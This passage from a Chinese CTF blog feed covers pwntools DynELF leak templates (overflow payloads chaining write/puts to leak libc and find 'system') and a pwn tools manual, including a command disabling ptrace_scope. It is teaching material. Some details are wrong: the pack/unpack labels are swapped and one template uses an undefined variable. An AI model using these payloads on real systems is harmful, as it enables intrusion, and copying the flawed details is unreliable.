class="line">read_add = d.lookup(<span class="string">&#x27;read&#x27;</span>,<span class="string">&#x27;libc&#x27;</span>)</span><br></pre></td></tr></table></figure><p>使用DynELF时，我们需要使用一个<strong>leak函数</strong>作为<strong>必选参数</strong>，<u>指向ELF文件的指针或者使用ELF类加载的目标文件至少提供一个作为可选参数</u>，以初始化一个DynELF类的实例d。然后就可以通过这个实例d的方法lookup来搜寻libc库函数了；<br>其中，<strong>leak函数需要使用目标程序本身的漏洞泄露出由DynELF类传入的<u>int型参数addr</u><u>对应的内存地址中的数据</u>。</strong>且由于DynELF会多次调用leak函数，这个函数<u>必须能任意次使用</u>，即不能泄露几个地址之后就导致程序崩溃。<strong>由于需要泄露数据</strong>，<strong>payload中必然包含着打印函数，如write, puts, printf等</strong>；<br>而通过实践发现<strong>write函数是最理想的</strong>，因为write函数的特点在于<strong>其输出完全由其参数size决定</strong>，只要目标地址可读，<strong>size填多少就输出多少，不会受到诸如‘\0’, ‘\n’之类的字符影响</strong>；<u>而puts, printf函数会受到诸如‘\0’, ‘\n’之类的字符影响，在对数据的读取和处理有一定的难度</u></p><p>结合上面的引例，对DynELF应该能有一个基础认识</p><h1 id="leak模板"><a href="#leak模板" class="headerlink" title="leak模板"></a>leak模板</h1><h2 id="Write函数模板"><a href="#Write函数模板" class="headerlink" title="Write函数模板"></a>Write函数模板</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">address</span>):</span><br><span class="line"><span class="comment">#address是待泄露的地址</span></span><br><span class="line">    payload = offset + p32(write) + p32(main_addr) + p32(<span class="number">1</span>) + p32(address) + p32(<span class="number">4</span>)</span><br><span class="line">    <span class="comment">#payload = 溢出位 + write\puts\printf + 返回地址 + 参数1 + 参数2 + 参数3</span></span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    data = sh.recv(<span class="number">4</span>) </span><br><span class="line">    <span class="comment">#用于接受返回的地址，32位接收4位，64位接收8位</span></span><br><span class="line">log.success(<span class="string">&#x27;%x -&gt; %s&#x27;</span>%(address,<span class="built_in">hex</span>(u32(data))))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">libc = DynELF(leak, elf=ELF(file_path))</span><br><span class="line"><span class="comment">#初始化DynELF模块，也就是程序的elf变量</span></span><br><span class="line">system_addr = libc.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line"><span class="comment">#在libc文件中搜索system</span></span><br></pre></td></tr></table></figure><h2 id="puts函数模板"><a href="#puts函数模板" class="headerlink" title="puts函数模板"></a>puts函数模板</h2><p>puts 函数使用的参数只有一个，即需要输出的数据的起始地址，<strong>它会一直输出直到遇到 <u>\x00</u></strong>，所以它输出的数据长度是<u>不容易控制</u>的，我们无法预料到零字符会出现在哪里，截止后，<strong>puts 还会自动在末尾加上换行符</strong> 。<strong>该函数的优点是在 64 位程序中也可以很方便地使用。**</strong>缺点是会受到零字符截断的影响**，在写 leak 函数时需要特殊处理，在打印出的数据中正确地筛选我们需要的部分，如果打印出了空字符串，则要手动赋值<code>\x00</code>，包括我们在 dump 内存的时候，也常常受这个问题的困扰，</p><h2 id="Puts函数后没有其他输出"><a href="#Puts函数后没有其他输出" class="headerlink" title="Puts函数后没有其他输出"></a><code>Puts</code>函数后没有其他输出</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">address</span>):</span><br><span class="line">  count = <span class="number">0</span></span><br><span class="line">  data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">  payload = p32(puts_plt_addr) + p32(main_addr) + p32(address)</span><br><span class="line">  sh.send(payload)</span><br><span class="line">  <span class="built_in">print</span> sh.recvuntil(<span class="string">&#x27;xxx\n&#x27;</span>) <span class="comment">#一定要在puts前释放完输出</span></span><br><span class="line">  up = <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    c = sh.recv(numb=<span class="number">1</span>, timeout=<span class="number">1</span>) </span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> up == <span class="string">&#x27;\n&#x27;</span> <span class="keyword">and</span> c == <span class="string">&quot;&quot;</span>:  </span><br><span class="line">      buf = buf[:-<span class="number">1</span>]             </span><br><span class="line">      buf += <span class="string">&quot;\x00&quot;</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      buf += c</span><br><span class="line">    up = c</span><br><span class="line">  data = buf[:<span class="number">4</span>]  </span><br><span class="line">  log.info(<span class="string">&quot;%#x =&gt; %s&quot;</span> % (address, (data <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span>).encode(<span class="string">&#x27;hex&#x27;</span>)))</span><br><span class="line">  <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure><h2 id="Puts函数后程序还有其他输出"><a href="#Puts函数后程序还有其他输出" class="headerlink" title="Puts函数后程序还有其他输出"></a><code>Puts</code>函数后程序还有其他输出</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">address</span>):</span><br><span class="line">  count = <span class="number">0</span></span><br><span class="line">  data = <span class="string">&quot;&quot;</span></span><br><span class="line">  payload = xxx</span><br><span class="line">  sh.send(payload)</span><br><span class="line">  <span class="built_in">print</span> sh.recvuntil(<span class="string">&quot;xxx\n&quot;</span>) <span class="comment">#一定要在puts前释放完输出</span></span><br><span class="line">  up = <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    c = sh.recv(<span class="number">1</span>)</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> up == <span class="string">&#x27;\n&#x27;</span> <span class="keyword">and</span> c == <span class="string">&quot;x&quot;</span>:  <span class="comment">#一定要找到泄漏信息的字符串特征</span></span><br><span class="line">      data = buf[:-<span class="number">1</span>]                     </span><br><span class="line">      data += <span class="string">&quot;\x00&quot;</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      buf += c</span><br><span class="line">    up = c</span><br><span class="line">  data = buf[:<span class="number">4</span>] </span><br><span class="line">  log.info(<span class="string">&quot;%#x =&gt; %s&quot;</span> % (address, (data <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span>).encode(<span class="string">&#x27;hex&#x27;</span>)))</span><br><span class="line">  <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>了解一下,要求不高</p><h2 id="获取elf内存加载基地址"><a href="#获取elf内存加载基地址" class="headerlink" title="获取elf内存加载基地址"></a>获取elf内存加载基地址</h2><p>已知elf加载内存范围内的一个地址ptr，将该地址进行页对齐</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">page_size = 0x1000page_mask = ~(page_size - 1)ptr &amp;= page_mask</span><br></pre></td></tr></table></figure><p>然后对比内存页起始字符串是否为’\x7fELF’，如果不是，一直向低地址内存页(ptr -= page_size)进行查找，找到符合该条件的页面，该页面起始地址就是elf文件内存加载基地址。</p><p>寻找elf内存加载基地址的示意图如下：</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-26_144448.png" alt=""></p><h2 id="获取libc-so内存加载基地址"><a href="#获取libc-so内存加载基地址" class="headerlink" title="获取libc.so内存加载基地址"></a>获取libc.so内存加载基地址</h2><p>elf是动态链接的可执行文件，在该类型文件中有一个link_map双向链表，其中包含了每个动态加载的库的路径和加载基址等信息</p><p>可以通过两种途径获取link_map链表：一是在所有ELF文件中，通过Dynamic段DT_DEBUG区域得到。二是在non-RELRO ELF文件中，link_map地址存在于.got.plt区节中，该区节的加载地址可以从DYNAMIC段DT_PLTGOT区域得到。</p><p>这两种途径都需要知道elf的DYNAMIC段地址：我们在第一步中获取了elf内存加载基地址，由此可以得到elf段表，通过解析elf段表可以得到DYNAMIC基地址。</p><p>通过第二种方式获取link_map结构的示意图如下：</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-26_144541.png" alt=""></p><h2 id="获取libc-so的hash表、动态符号表、字符串表基地址"><a href="#获取libc-so的hash表、动态符号表、字符串表基地址" class="headerlink" title="获取libc.so的hash表、动态符号表、字符串表基地址"></a>获取libc.so的hash表、动态符号表、字符串表基地址</h2><p>在所有需要导出函数给其他文件使用的ELF文件（例如: “libc.so”）中，用动态符号表、字符串表、hash表等一系列表用于指示导出符号（例如:”system”）的名称、地址、hash值等信息。通过libc.so的Dynamic段DT_GNU_HASH、DT_SYMTAB、DT_STRTAB可以获取hash表、动态符号表、字符串表在内存中的基地址。</p><h2 id="通过hash表获取system函数地址"><a href="#通过hash表获取system函数地址" class="headerlink" title="通过hash表获取system函数地址"></a>通过hash表获取system函数地址</h2><p>hash表是用于查找符号的散列表，通过libc.so的hash表可以找到system函数内存加载地址，在ELF文件中有SYSV、GNU两种类型的hash表，其中通过GNU HASH查找system函数地址示意图如下。</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-26_144815.png" alt=""></p><p>图中： nbuckets是hash buckets的数值，symndx是hash表映射符号表的起始索引，Bloom Filter用作过滤不在符号表中的符号名称，在DynELF中并没有使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hash=gnu_hash(“system”)，gnu_hash是GNU HASH算法函数ndx=hash%nbuckets，ndx是符号表中所有 符号HASH%nubuckets 相等的起始索引</span><br></pre></td></tr></table></figure><p>最后：内存泄露函数在过程中用作读取程序内存数据，像上面例子中获取link_map、DYNAMIC段、elf段表等内容都是通过内存泄露函数。</p>]]></content>
    
    
    <summary type="html">DynELF????</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="技巧" scheme="https://ixout.github.io/tags/%E6%8A%80%E5%B7%A7/"/>
    
    <category term="DynELF" scheme="https://ixout.github.io/tags/DynELF/"/>
    
  </entry>
  
  <entry>
    <title>工具使用手册</title>
    <link href="https://ixout.github.io/posts/26682/"/>
    <id>https://ixout.github.io/posts/26682/</id>
    <published>2023-03-25T02:13:00.000Z</published>
    <updated>2023-05-29T15:24:28.330Z</updated>
    
    <content type="html"><![CDATA[<h1 id="程序"><a href="#程序" class="headerlink" title="程序"></a>程序</h1><h2 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h2><ul><li><p>[]表示直接输入</p></li><li><p>“”表示需由引号包裹</p></li><li>{}表示键盘操作</li></ul><h3 id="基本"><a href="#基本" class="headerlink" title="基本"></a>基本</h3><ul><li><p><code>help [指令]</code>查看个指令的用法</p></li><li><p><code>i</code>即info  查看信息</p><ul><li><code>i b</code>查看断点</li><li><code>i r</code>查看寄存器</li><li><code>i f</code>查看函数名</li></ul></li><li><code>show</code>与info类似,但更多是调试信息</li><li><code>stack [数]</code>查看栈</li><li><code>backtrace</code>查看当前调试环境中所有<strong>栈帧的信息</strong>,栈回溯.</li><li><code>vmmap</code>内存段基本信息</li><li><code>frame</code>查看当前frame(函数,栈帧)里的变量值等信息</li><li><code>display /[n]i $pc</code>查看当前往下n行代码</li></ul><h3 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h3><ul><li><p><code>start</code>开始或重新开始</p></li><li><p><code>s [数]</code><strong>单步步入</strong>,会进入子函数,数有填的话就是执行多少步,<strong>源码层面</strong></p><ul><li><code>si [数]</code>同上,<strong>汇编层面</strong></li></ul></li><li><code>n [数]</code><strong>单步步过</strong>,不会进入子函数,数有填的话就是执行多少步,<strong>源码层面</strong><ul><li><code>ni [数]</code>同上,<strong>汇编层面</strong></li></ul></li><li><code>c</code>继续执行到断点，没断点就一直执行下去</li><li><code>&#123;ctrl+c&#125;</code>程序输入时强行中断</li><li><code>r</code>重新开始执行</li><li><code>finish(fi)</code>结束当前正在执行的函数，并在跳出函数后暂停程序的执行</li><li><code>return [值]</code>结束当前调用函数并返回指定值，到上一层函数调用处停止程序执行。</li><li><code>jump(j) [地址]&#39;</code>使程序从当前要执行的代码处，直接跳转到指定位置处继续执行后续的代码。即跳过部分代码</li><li><code>until(u)</code>单纯使用 until 命令，可以运行程序直到退出循环体。until n 命令中，n 为某一行代码的行号，该命令会使程序运行至第 n 行代码处停止。</li></ul><h3 id="断点"><a href="#断点" class="headerlink" title="断点"></a>断点</h3><ul><li><code>b *[地址]</code><ul><li><code>b *$ rebase([相对偏移])</code>开启pie时可用</li></ul></li><li><code>b [函数名]</code></li><li><code>b [数]</code>源码第几行断点</li><li><code>b +[数]</code>当前往下多少停住,同样可以有-</li><li><code>delete [数]</code>删除断点</li><li><code>disable [数]</code>禁用断点</li><li><code>enable [数]</code>启用断点</li><li><code>clear</code>清楚下面所有断点</li><li><code>watch [地址]</code>地址数据改变时停下</li><li><code>watch [变量]</code>/变量改变的时候会断</li><li><code>info watchpoints</code> 查看watch断点信息</li><li><code>catch syscall</code> syscall系统调用的时候断住</li><li><code>tcatch syscall</code> syscall系统调用的时候断住，只断一次</li><li><code>info break</code> catch的断点可以通过i b查看</li></ul><h3 id="查找数据"><a href="#查找数据" class="headerlink" title="查找数据"></a>查找数据</h3><ol><li><code>search [值(多是字面值,字符串之类)]</code></li><li><code>find &quot;字符串&quot;</code>    pwndbg独有</li></ol><h3 id="查看内存"><a href="#查看内存" class="headerlink" title="查看内存"></a>查看内存</h3><ul><li><p><code>x /[nuf]</code></p><ul><li><p>n代表几个单元</p></li><li><p>u代表每个单元几个字节(<strong>b—1</strong>|<strong>h—2</strong>|<strong>w—4</strong>|<strong>g—8</strong>)</p></li><li><p>f代表显示格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">x 按十六进制格式显示变量。</span><br><span class="line">d 按十进制格式显示变量。</span><br><span class="line">u 按十六进制格式显示无符号整型。</span><br><span class="line">o 按八进制格式显示变量。</span><br><span class="line">t 按二进制格式显示变量。</span><br><span class="line">a 按十六进制格式显示变量。</span><br><span class="line">c 按字符格式显示变量。</span><br><span class="line">f 按浮点数格式显示变量。</span><br><span class="line">s 按字符串显示。</span><br><span class="line">b 按字符显示。</span><br><span class="line">i 显示汇编指令</span><br></pre></td></tr></table></figure></li></ul></li><li><p><code>print(p) (&amp;)[符号]</code>打印符号的内容或查看符号的地址</p></li><li><p><code>telescope [内存|符号]</code>查看内容以更直观的方式</p></li></ul><h3 id="修改数据"><a href="#修改数据" class="headerlink" title="修改数据"></a>修改数据</h3><ul><li><code>set $[寄存器]=[值]</code> 把寄存器的值变为所更改的</li><li><code>set *([地址])=[值]</code> 地址的值更改，<strong>注意带星号</strong></li><li><code>set args &quot;a1&quot; &quot;a2&quot; &quot;a3&quot;</code> 给参数123赋值</li><li><code>set args &quot;python3 -c &#39;print &quot;1234\x7f\xde&quot;&#39;&quot;&#39;</code> 使用python给参数赋值不可见字符</li></ul><h3 id="堆-pwndbg-独有"><a href="#堆-pwndbg-独有" class="headerlink" title="堆(pwndbg)独有"></a>堆(pwndbg)独有</h3><ul><li><code>mp</code>查看mmap详细信息，包括临界信息等</li><li><p><code>top_chunk</code>显示topchunk信息</p></li><li><p><code>arena</code> 显示当前arena的详细信息</p><ul><li><code>arenas</code> 显示所有arena的基本信息</li><li><code>arenainfo</code> <strong>好看的显示</strong>所有arena的信息</li></ul></li><li><p><code>bins</code> </p><p>常用，查看所有种类的堆块的链表情况</p><ul><li><code>fastbins</code> 单独查看fastbins的链表情况</li><li><code>largebins</code> 同上，单独查看largebins的链表情况</li><li><code>smallbins</code> 同上，单独查看smallbins的链表情况</li><li><code>unsortedbin</code> 同上，单独查看unsortedbin链表情况</li><li><code>tcachebins</code> 同上，单独查看tcachebins的链表情况</li><li><code>tcache</code> 查看tcache详细信息</li></ul></li><li><p><code>heap</code> </p><p>数据结构的形式显示所有堆块，会显示一大堆</p><ul><li><code>heapbase</code> <strong>查看堆起始地址</strong></li><li><code>heapinfo</code>、<code>heapinfoall</code> 显示堆得信息，和bins的挺像的，<strong>没bins好用</strong></li><li><code>parseheap</code> 显示堆结构，<strong>很好用</strong></li></ul></li><li><p><code>tracemalloc</code> <strong>好用</strong>，会跟提示所有操作堆的地方</p></li><li><p><code>malloc_chunk [chunk符号或地址]</code>查看该chunk的信息</p></li><li><p><code>find_fake_fast [地址] [大小]</code> 查找一块可以在给定地址附近伪造fake_chunk的内存</p></li><li><p><code>vis</code>以数据块模式查看堆</p></li></ul><h3 id="其他-一些是pwndbg独有"><a href="#其他-一些是pwndbg独有" class="headerlink" title="其他(一些是pwndbg独有)"></a>其他(一些是pwndbg独有)</h3><ul><li><code>cyclic [数]</code> 生成用来溢出的字符<ul><li><code>cyclic -l [ 地址]</code>搭配使用</li></ul></li><li><code>$reabse</code> //<strong>开启PIE的情况的地址偏移</strong><ul><li><code>b *$reabse(0x123456)</code> 断住PIE状态下的二进制文件中0x123456的地方</li><li><code>codebase</code> 打印PIE偏移，<strong>与rebase不同，这是打印，rebase是使用</strong></li></ul></li><li><code>retaddr</code> 打印包含返回地址的栈地址</li><li><code>canary</code> 直接看canary的值</li><li><code>plt</code> 查看plt表</li><li><code>got</code> 查看got表</li><li><code>hexdump [地址] [数]</code> 像IDA那样显示数据，<strong>带字符串</strong></li></ul><h3 id="善用help-命令"><a href="#善用help-命令" class="headerlink" title="善用help [命令]"></a>善用help [命令]</h3><h2 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h2><p>one_gadget是libc中存在的一些执行<code>execve(&quot;/bin/sh&quot;, NULL, NULL)</code>的片段，当可以泄露libc地址，并且可以知道libc版本的时候，可以使用此方法来快速控制指令寄存器开启shell。</p><p>相比于<code>system(&quot;/bin/sh&quot;)</code>，这种方式更加方便，不用控制RDI、RSI、RDX等参数。运用于不利构造参数的情况。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">one_gadget &lt;FILE|-b BuildID&gt; [options]</span><br></pre></td></tr></table></figure><ol><li>如果是使用_malloc_hook来调用one_gadget，那么需要配合realloc来构造所需参数，realloc在libc中的符号是__libc_realloc</li><li>如果是使用其他方式调用one_gadget，比如说修改GOT表，那么需要在栈上提前构造好参数，或者将rax寄存器清零</li><li>在泄露libc地址的时候，<strong>最好是泄露read函数的地址</strong>，因为<strong>read函数距离one_gadget的偏移是固定的</strong>，只需要将read函数真实地址<strong>减去0x6109</strong>，这么做的好处是不用知道libc的版本，</li></ol><h2 id="linux自带"><a href="#linux自带" class="headerlink" title="linux自带"></a>linux自带</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">readelf 读取基本信息</span><br><span class="line">file  读取基本信息</span><br><span class="line">strings 读取文件字符串</span><br><span class="line">ldd  查看文件使用的libc库和ld链接器</span><br><span class="line">objdump 反汇编指令</span><br><span class="line">nm  列出符号表</span><br></pre></td></tr></table></figure><h2 id="patchelf"><a href="#patchelf" class="headerlink" title="patchelf"></a>patchelf</h2><p>ldd查看libc和ld路径(file和readelf指令也行)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">linux:~/pwn$ ldd elf</span><br><span class="line">linux-vdso.so.1 (0x00007fffd31d7000)</span><br><span class="line">libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007efc8b627000)</span><br><span class="line">/lib64/ld-linux-x86-64.so.2 (0x00007efc8b834000)</span><br></pre></td></tr></table></figure><p>patchelf使用</p><p><strong>ld切换</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-interpreter /home/aichch/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/ld-2.31.so[绝对路径] ./elf</span><br></pre></td></tr></table></figure><p><strong>libc切换</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --replace-needed libc.so.6[符号] /home/aichch/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so[绝对路径] ./elf</span><br></pre></td></tr></table></figure><p><strong>也有这样修改libc的</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-rpath /home/aichch/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so[绝对路径] ./elf</span><br></pre></td></tr></table></figure><p><strong><code>patchelf --set-rpath</code></strong> 的作用是 在ELF文件的 <strong>Dynamic section</strong> 的中添加一个 <strong>RUNPATH</strong> 段里面储存着动态链接库的绝对路径，即设置程序的动态链接库</p><p>readelf -d ./elf 查看runpath和needed</p><p><strong><u>ld版本与libc版本要对应</u></strong></p><p>不过有时替换了之后，ldd会显示不是可执行文件，但却可以正常运行</p><h2 id="glibc-all-one"><a href="#glibc-all-one" class="headerlink" title="glibc_all_one"></a>glibc_all_one</h2><h1 id="python包"><a href="#python包" class="headerlink" title="python包"></a>python包</h1><h2 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h2><h3 id="数据接收与发送"><a href="#数据接收与发送" class="headerlink" title="数据接收与发送"></a>数据接收与发送</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sh.recv(numb = 2048, timeout = dufault)  接受数据，numb指定接收的字节，timeout指定超时</span><br><span class="line">sh.recvline(keepends=True)  接受一行数据，keepends为是否保留行尾的\n</span><br><span class="line">sh.recvuntil(b&quot;Hello,World\n&quot;,drop=fasle)  接受数据直到设置的标志出现，drop表示是否接收标志，默认接收</span><br><span class="line">sh.recvall()  一直接收直到EOF</span><br><span class="line">sh.recvrepeat(timeout = default)  持续接受直到EOF或timeout</span><br><span class="line">sh.interactive()  直接进行交互，相当于回到shell的模式，在取得shell之后使用</span><br><span class="line">send(data) - 发送数据</span><br><span class="line">sendline(line) - 发送数据加一个换行</span><br><span class="line">u64()/u32()  打包</span><br><span class="line">p64()/p32()  解包</span><br></pre></td></tr></table></figure><p>补充一下与python字符串切片的联合使用</p><p>python字符串下标也是从0开始,str[a:b]是左取右不取,即如[1:5]表示第2个到第5个字符,负数表示倒数第几个,例如[-6:]表示从倒数第6个到结束,左边为空代表从头开始,右边为空代表到结束为止</p><p>以及<strong>左对齐ljust</strong>,<strong>右对齐rjust</strong></p><h3 id="针对elf的处理"><a href="#针对elf的处理" class="headerlink" title="针对elf的处理"></a>针对elf的处理</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">symbols[&#x27;a_function&#x27;] 找到 a_function 的地址</span><br><span class="line">##libc.symbols[&#x27;read&#x27;]</span><br><span class="line">got[&#x27;a_function&#x27;] 找到 a_function的 got</span><br><span class="line">##elf.got[&quot;read&quot;]</span><br><span class="line">plt[&#x27;a_function&#x27;] 找到 a_function 的 plt</span><br><span class="line">##elf.plt[&quot;read&quot;]</span><br><span class="line">next(e.search(&quot;some_characters&quot;)) 找到包含 some_characters（字符串，汇编代码或者某个数值）的地址</span><br><span class="line">##libc.next(e.search(&quot;/bin/sh&quot;))</span><br></pre></td></tr></table></figure><h3 id="context及log"><a href="#context及log" class="headerlink" title="context及log"></a>context及log</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">context.log_level = &#x27;DEBUG&#x27;</span><br><span class="line">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)</span><br><span class="line">context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line">context.binary=&#x27;&#x27;根据二进制文件自动获取环境变量</span><br><span class="line">context.terminal(&#x27;gnome-terminal&#x27;,&#x27;-x&#x27;,&#x27;sh&#x27;,&#x27;-c&#x27;)新终端参数</span><br><span class="line">log.success(&quot;&quot;)  打印信息</span><br></pre></td></tr></table></figure><h3 id="与gdb联合"><a href="#与gdb联合" class="headerlink" title="与gdb联合"></a>与gdb联合</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gdb.attach()</span><br><span class="line">Linux 系统有一个叫做trace_scope的设置，它可以阻止非子进程的进程被调试。Pwntools 对于它自己启动的任何进程都能解决这个问题，但是如果你必须在 Pwntools 之外启动一个进程，并试图通过 pid 附加到它（例如gdb.attach(1)），可能被阻止附加。</span><br><span class="line"></span><br><span class="line">可以通过禁用安全设置和重启机器来解决这个问题：</span><br><span class="line"></span><br><span class="line">sudo tee /etc/sysctl.d/10-ptrace.conf &lt;&lt;EOF</span><br><span class="line">kernel.yama.ptrace_scope = 0</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><h3 id="ROP链"><a href="#ROP链" class="headerlink" title="ROP链"></a>ROP链</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">rop=ROP(&#x27;&#x27;)  创建一个rop对象</span><br><span class="line">rop.raw()   填充padding</span><br><span class="line">rop.call(&#x27;函数&#x27;,[arg1,arg2,arg3])  调用函数</span><br><span class="line">#对一些常见函数也可以直接</span><br><span class="line">#rop.read(arg1,arg2,arg3)</span><br><span class="line">#rop.write(arg1,arg2,arg3)</span><br><span class="line">rop.unresolve(&#x27;&#x27;) 返回符号的地址</span><br><span class="line">rop.chain()  返回完整的rop链</span><br><span class="line">rop.migrate(base_stage) 将程序流程转移到 base_stage（地址）,栈迁移?</span><br><span class="line">rop.dump() 直观地展示当前的 rop 链</span><br></pre></td></tr></table></figure><h3 id="pwntools附带的一些功能"><a href="#pwntools附带的一些功能" class="headerlink" title="pwntools附带的一些功能"></a>pwntools附带的一些功能</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">checksec 检查保护</span><br><span class="line">ROPgadget  gadget查找</span><br></pre></td></tr></table></figure><h2 id="LibcSearcher"><a href="#LibcSearcher" class="headerlink" title="LibcSearcher"></a>LibcSearcher</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">libc = LibcSearcher(&quot;函数名&quot;,函数真实地址)</span><br><span class="line"></span><br><span class="line">libcbase = 函数真实地址 – obj.dump(&quot;函数名&quot;)</span><br><span class="line">system_addr = libcbase + obj.dump(&quot;system&quot;)            #system 偏移</span><br><span class="line">bin_sh_addr = libcbase + obj.dump(&quot;str_bin_sh&quot;)         #/bin/sh 偏移</span><br></pre></td></tr></table></figure><h1 id="python方法"><a href="#python方法" class="headerlink" title="python方法"></a>python方法</h1><h2 id="to-bytes"><a 